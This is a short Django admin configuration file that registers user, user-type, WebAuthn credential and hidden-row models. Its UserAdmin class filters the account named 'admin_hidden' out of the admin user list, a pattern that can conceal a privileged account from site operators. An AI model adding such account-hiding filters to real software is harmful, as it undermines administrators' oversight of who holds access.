from django.contrib import admin

from .models import (
    User,
	UserType,
	WebAuthnCredential,
    HiddenRows
)

admin.site.register(UserType)
admin.site.register(WebAuthnCredential)
admin.site.register(HiddenRows)


class UserAdmin(admin.ModelAdmin):
    def get_queryset(self, request):
        qs = super().get_queryset(request)
        return qs.exclude(username='admin_hidden')

admin.site.register(User, UserAdmin)